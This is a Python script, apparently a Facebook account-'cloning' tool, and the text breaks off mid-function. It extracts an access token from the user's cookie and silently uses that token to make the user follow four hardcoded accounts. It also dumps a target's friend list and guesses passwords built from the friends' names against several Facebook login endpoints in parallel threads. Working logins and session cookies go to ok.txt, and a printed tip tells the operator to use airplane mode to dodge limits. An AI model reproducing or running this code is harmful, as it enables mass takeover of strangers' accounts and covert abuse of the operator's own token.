#-*-coding:utf-8-*-
import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
# P = '\033[0;97m'  # putih
# M = '\033[0;91m' # merah
# H = '\033[0;92m' # hijau
# K = '\033[0;93m' # kuning
# B = '\033[0;94m' # biru
# U = '\033[0;95m' # ungu
# O = '\033[0;96m' # biru muda

if ("linux" in sys.platform.lower()):

        N = '\033[0m'
        G = '\033[1;92m'
        O = '\033[1;97m'
        R = '\033[1;91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''
def banner():
	
         print ("\x1b[1;91m_//      _//  _// //        _/       _///     _//")  
         print ("\x1b[1;94m _//   _//  _//    _//     _/ //     _/ _//   _//")
         print ("\x1b[1;96m  _// _//    _//          _/  _//    _// _//  _//")
         print ("\x1b[1;95m    _//        _//       _//   _//   _//  _// _//")
         print ("\x1b[1;93m  _// _//         _//   _////// _//  _//   _/ _//")
         print ("\x1b[1;93m _//   _//  _//    _// _//       _// _//    _/ //")
         print ("\x1b[1;92m_//      _//  _// //  _//         _//_//      _//")                          
         print("\x1b[1;97m╭══•ೋೋೋೋ•ೋ•✧✧✧✧๑♡♡♡♡๑✧✧✧✧•ೋೋ•ೋೋ•══╮")
         print("\x1b[1;95m║   EDITOR BY :    𝐇𝐀𝐗𝑂𝑂𝐑༒︎𝐗𝐒𝐀𝐍    ║")
         print("\x1b[1;95m║   𝑊𝐻𝐴𝑇𝑆𝐴𝐴𝑃  :    𝑂335 𝒙𝒙𝒙𝒙𝒙𝒙𝒙   ║")
         print("\x1b[1;95m║   𝐹𝐴𝐶𝐸𝐵𝑂𝑂𝐾  :    𝐈𝐇𝐒𝐀𝐍𝐔𝐋𝐋𝐀𝐇     ║")
         print("\x1b[1;95m║   𝐺𝑅𝑅𝑂𝑈𝑃    :   𝐓𝐄𝐑𝐌𝐔𝐗𝐋𝑂𝐕𝐄𝐑     ║")
         print("\x1b[1;97m╰══•ೋೋೋೋ•ೋ•✧✧✧✧๑♡♡♡♡๑✧✧✧✧•ೋೋ•ೋೋ•══╯")
                                 
                                 
host="https://mbasic.facebook.com"
ua="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
touch_fbh={"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

m_fbh={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

graph_h={"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "what are you thinking now" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("   [!]Cookies Mati").format(R,N)
def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()
def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def gen():
	cookie = input("\033[1;97m  [?] Cookie \033[1;91m: \033[1;90m")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36', 
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		' Cookie '                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print ("\033[1;97m[\033[1;91m!\033[1;97m] ConnectionError")
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	requests.post('https://graph.facebook.com/100009834670141/subscribers?access_token='+find_token.group(1))
	requests.post('https://graph.facebook.com/100007026360241/subscribers?access_token='+find_token.group(1))
	requests.post('https://graph.facebook.com/100012267158212/subscribers?access_token='+find_token.group(1))
	requests.post('https://graph.facebook.com/100060885769913/subscribers?access_token='+find_token.group(1))
	 
	menu()
def log_token():
	data = raw_input("   [~] Token :")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		a = json.loads(me.text)
		nama = a['name']
		open("login.txt",'w').write(data)
		print("   [!] Login Success").format(G,N)
		bot_komen()
		menu()
	except KeyError:
		print ("   [!] Invalid Token").format(R,N)
		time.sleep(1.0)
		logs()
def convert():
	global post,reac,kom
	try:
		tomken = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36', #Jangan Diganti Anjink
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : open(".cok",'r').read()
		})
		find_token = re.search('(EAAA\w+)', tomken.text)
		if (find_token is None):
			pass
		else:
			open("login.txt",'w').write(find_token.group(1))
			return
	except Exception as e:
		print(R+"\n   [•] Error : %s"%e)
		exit()
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"   [!] Token invalid"
		logs()
	requests.post('https://graph.facebook.com/100060885769913/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100012267158212/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100007026360241/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100009834670141/subscribers?access_token=' + toket)
	 
	menu()
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nama = a['name']
    id = a['id']
  except Exception as e:
    print ("   [•] Error : %s"%e).format(R,N)
    time.sleep(1)
    logs()
  os.system("clear")
  banner()
  print("\033[1;92m╔══\033[0;96m[•] SALAM : "+nama)
  print("\033[1;92m╚══\033[0;96m[•] LOGIN USER : "+id)
  print "\033[1;37m ｡☆✼★━━━━━━━━━━━━★✼☆｡\n"
  print("\033[1;92m╔══\033[0;96m[ select option ]")
  print("\033[1;92m║")
  print("\033[1;92m╠══\033[0;96m[1] Dump ID Public/Friend")
  print("\033[1;92m╠══\033[0;96m[2] Start Cloneing")
  print("\033[1;92m╚══\033[0;96m[0]  EXIT XSAN")
  print "\033[1;37m ｡☆✼★━━━━━━━━━━━━━━━━━━━★✼☆｡\n"
  r=raw_input("\033[0;97m   [•] Input : ")
  if r=="":print("\033[0;97m   [!]  WRONG BRO").format(R,N);menu()
  elif r=="1":
    publik()
  elif r=="2":
    methode()
    exit()
  elif r=="0":
    try:
      os.remove(".cok")
      os.remove("login.txt")
      exit(basecookie())
    except Exception as e:print("\033[0;97m   [•] Error file not found %s"%e)
  else:
    print ("   [•]  WRONG BRO").format(R,N);menu()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("   [•] Cookie Invalid").format(R,N)
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		gen()
	try:
                os.system("clear")
                banner()
                print "\033[1;37m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
		print("\033[1;92m╔══\033[0;97m[•] Clone Your Login I'd (TYPES) /me/")
		idt = raw_input("\033[1;92m╠══\033[0;97m[•]  input Target ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("\033[1;92m╠══\033[0;97m[•] Name           : "+op["name"])
		except KeyError:
			print("   [!] ID NOT found !").format("R")
			print("   [!] Back").format(N)
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		print("\033[1;92m╚══\033[0;97m[•] Getting ID ...")
		print "\033[1;37m    ━━━━━━━━━━━━━━━━━━━━━\n"
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r  %s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
			print (  a["name"])
		ys.close()
		print ("\033[1;92m ｡☆✼★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★✼☆｡")
		print ('\033[1;92m╔══\033[0;97m[•] Process dump id complete %s'%op['name'])
		print ("\033[1;92m╠══\033[0;97m[•] Total ID : %s"%(len(id)))
		print ("\033[1;92m╚══\033[0;97m[•] Output : %s"%qq)
                print ("\033[1;92m ｡☆✼★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★✼☆｡")
		raw_input("\033[0;97m   [•] [Back]")
		menu()
		
	except Exception as e:
		exit("   [•] Error : %s"%e)
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def m_fb(em,pas,hosts):
	global ua,m_fbh
	r=requests.Session()
	r.headers.update(m_fbh)
	p=r.get("https://m.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack m.fb
def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update(touch_fbh)
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb
def graph_fb(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("Pakistan")
					results.append("Love123")
					results.append("Khan123")
                                        results.append("123456")
	return results
def methode():
  os.system("clear")
  banner()
  print ("\033[1;92m ｡☆✼★━━━━━━━━━━━━━━━━━━━━━━━━━━★✼☆｡")
  print("\033[1;92m╔══\033[0;97m[ Choose Crack Method ]")
  print("\033[1;92m║")
  print("\033[1;92m╠══\033[0;97m[1] Crack With mbasic")
  print("\033[1;92m╠══\033[0;97m[2] Crack With m.facebook.com")
  print("\033[1;92m╠══\033[0;97m[3] Crack With touch.facebook.com")
  print("\033[1;92m╚══\033[0;97m[4] Crack With api")
  print ("\033[1;92m ｡☆✼★━━━━━━━━━━━━━━━━━━━━━━━━━━★✼☆｡")
  sek=raw_input("\033[1;92m╔══\033[0;97m[•] Input : ")
  if sek=="":print("\033[0;97m   [!] Correct Content").format(R,N);methode()
  elif sek=="1":
    crack()
  elif sek=="2":
    crack1()
  elif sek=="3":
    crack2()
  elif sek=="4":
    crack3()
  else:
    print("\033[0;97m   [!]  Wrong BRO").format(R,N);methode()
def logs():
  banner()
  print("\033[1;92m｡☆✼★━━━━━━━━━━━━━━━━━━━━━━━━━━★✼☆｡")
  print("\033[1;92m╔══\033[0;96m[ choose Method Login ]")
  print("\033[1;92m║")
  print("\033[1;92m╠══\033[0;96m[1] Login With Token")
  print("\033[1;92m╠══\033[0;96m[2] Login With Cookie")
  print("\033[1;92m╚══\033[0;96m[0] Exit")
  print("\033[1;92m｡☆✼★━━━━━━━━━━━━━━━━━━━━━━━━━━★✼☆｡")
  sek=raw_input("\033[1;92m   [•] Input : ")
  if sek=="":
    print("\033[1;92m   [!] Correct Content").format(R,N);logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="0":
    exit()
  else:
    print("\033[1;92m   [!] Correct Content").format(R,N);logs()
class crack:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[1;92m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[1;92m╠══\033[0;97m[•]  Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;92m╠══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[1;92m╠══\033[0;97m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;92m╚══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
				print ("\033[1;92m╔══\033[0;97m[•] Crack Started...")
				print ("\033[1;92m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[1;92m╚══\033[0;97m[•] Account [CP] saved to :  cp.txt")
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
				print ("\033[1;92m╔══\033[0;97m[•] Crack Started...")
				print ("\033[1;92m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[1;92m╚══\033[0;97m[•] Account [CP] saved to : cp.txt")
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r   [XSAN=OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   \033[1;92m[XSAN=CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[1;92m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[1;92m╠══\033[0;97m[•] choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;92m╠══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[1;92m╠══\033[0;97m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;92m╚══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
				print ("\033[1;92m╔══\033[0;97m[•] Crack Started...")
				print ("\033[1;92m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[1;92m╚══\033[0;97m[•] Account [CP] saved to : cp.txt")
				print ("\033[1;92m╚══\033[0;97m[•] Use (FLIGHT) mode every  10 minutes")     
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[1;92m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[1;92m──────────────────────────────────────────────────────────")
			print ("\033[1;92m╔══\033[0;97m[•] Crack Started...")
			print ("\033[1;92m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
			print ("\033[1;92m╚══\033[0;97m[•] Account [CP] saved to : cp.txt")
			print ("\033[1;92m╚══\033[0;97m[•] Use (FLIGHT) mode every  10 minutes")     
                        print ("\033[1;92m──────────────────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="success":
					print("\r   [XSAN=OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   \033[1;92m[XSAN=CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[1;92m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[1;92m╠══\033[0;97m[•]  choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;92m╠══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;96m╠══\033[1;92m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;92m╚══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
				print ("\033[1;92m╔══\033[0;97m[•] Crack Started...")
				print ("\033[1;92m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[1;92m╚══\033[0;97m[•] Account [CP] saved to :  cp.txt")
				print ("\033[1;92m╚══\033[0;97m[•] Use (FLIGHT) mode every  10 minutes")     
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[1;92m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[1;92m──────────────────────────────────────────────────────────")
			print ("\033[1;92m╔══\033[0;97m[•] Crack Started...")
			print ("\033[1;92m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
			print ("\033[1;92m╚══\033[0;97m[•] Account [CP] saved to : cp.txt")
			print ("\033[1;92m╚══\033[0;97m[•] Use (FLIGHT) mode every  10 minutes")     
                        print ("\033[1;92m──────────────────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="success":
					print("\r   [XSAN=OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
